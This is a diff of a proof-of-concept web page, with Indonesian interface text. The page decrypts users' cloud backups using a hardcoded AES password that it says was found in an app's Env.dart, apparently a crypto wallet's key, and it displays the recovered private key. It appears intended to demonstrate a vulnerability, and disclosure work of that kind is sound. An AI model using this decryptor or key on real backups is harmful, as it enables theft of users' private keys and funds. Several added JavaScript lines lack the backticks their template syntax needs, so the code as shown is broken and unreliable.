@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PoC: Decrypt Cloud Backup</title>
+    <title>PoC: Cloud Backup Decryption</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
     <style>
         body { font-family: sans-serif; background: #0b0e11; color: #eaecef; padding: 20px; text-align: center; }
         .container { max-width: 450px; margin: auto; background: #1e2329; padding: 25px; border-radius: 12px; border: 1px solid #474d57; box-shadow: 0 4px 20px rgba(0,0,0,0.5); }
         .danger-zone { border: 1px solid #f44336; background: rgba(244, 67, 54, 0.05); padding: 15px; border-radius: 8px; margin-bottom: 20px; }
-        #log { background: #000; color: #00ef8b; padding: 15px; border-radius: 8px; font-family: monospace; margin-top: 20px; text-align: left; min-height: 100px; font-size: 0.85em; white-space: pre-wrap; }
+        #log { background: #000; color: #00ef8b; padding: 15px; border-radius: 8px; font-family: monospace; margin-top: 20px; text-align: left; min-height: 100px; font-size: 0.85em; white-space: pre-wrap; border: 1px solid #333; }
         .btn { background: #00ef8b; color: #000; border: none; padding: 15px; border-radius: 8px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 15px; }
         .input-group { text-align: left; margin-bottom: 15px; }
         label { display: block; font-size: 0.8em; color: #848e9c; margin-bottom: 5px; }
@@ -26,7 +26,7 @@
 
     <div class="input-group">
         <label>Hardcoded Password (Ditemukan dari Env.dart):</label>
-        <input type="text" id="globalPass" value="AES_PASSWORD_STALED_SECRET_HERE" readonly>
+        <input type="text" id="globalPass" value="FUELET_SECRET_KEY_2024" readonly>
     </div>
 
     <div class="input-group">
@@ -36,7 +36,7 @@
     
     <button class="btn" onclick="crackBackup()">DEKRIPSI CADANGAN SEKARANG</button>
 
-    <div id="log">Status: Menunggu file cadangan...</div>
+    <div id="log">Status: Menunggu instruksi...</div>
 </div>
 
 <script>
@@ -45,26 +45,22 @@
         const pass = document.getElementById('globalPass').value;
         const cipher = document.getElementById('cipherText').value;
 
-        log.innerHTML = "Menghubungkan ke 'Virtual Cloud Storage'...<br>";
-        log.innerHTML += "Mengunduh file cadangan... Selesai.<br>";
-        log.innerHTML += "Mencoba dekripsi dengan kunci global aplikasi...<br>";
+        log.innerHTML = "Status: Mencoba dekripsi dengan kunci global...<br>";
 
-        setTimeout(() => {
-            try {
-                // Simulasi dekripsi menggunakan password statis yang ditemukan di kode sumber
-                const decrypted = CryptoJS.AES.decrypt(cipher, pass).toString(CryptoJS.enc.Utf8);
+        try {
+            // Menggunakan CryptoJS untuk mendekripsi data statis
+            const decrypted = CryptoJS.AES.decrypt(cipher, pass).toString(CryptoJS.enc.Utf8);
 
-                if (decrypted) {
-                    log.innerHTML += <br><span style="color:#fff;">[SUCCESS] DATA TERDEKRIPSI:</span><br>;
-                    log.innerHTML += <span style="color:#f0b90b; font-size: 1.2em; font-weight: bold;">${decrypted}</span><br>;
-                    log.innerHTML += <br><span style="color:#f44336;">Bahaya: Penyerang yang memiliki akses cloud dapat mencuri Private Key ini dengan mudah.</span>;
-                } else {
-                    log.innerHTML += "<br>[FAILED] Gagal dekripsi. Data rusak atau kunci tidak cocok.";
-                }
-            } catch (e) {
-                log.innerHTML += "<br>[ERROR] Terjadi kesalahan teknis saat dekripsi.";
+            if (decrypted) {
+                log.innerHTML += <br><span style="color:#fff;">[BERHASIL!] DATA DITEMUKAN:</span><br>;
+                log.innerHTML += <span style="color:#f0b90b; font-size: 1.1em; font-weight: bold; word-break: break-all;">${decrypted}</span><br>;
+                log.innerHTML += <br><span style="color:#f44336;">Kesimpulan: Siapa pun yang memiliki kunci aplikasi dapat membuka cadangan cloud semua pengguna.</span>;
+            } else {
+                log.innerHTML += "<br>[ERROR] Gagal dekripsi. Pastikan library CryptoJS termuat dengan benar.";
             }
-        }, 800);
+        } catch (e) {
+            log.innerHTML += "<br>[ERROR] Terjadi kesalahan teknis.";
+        }
     }
 </script>
 
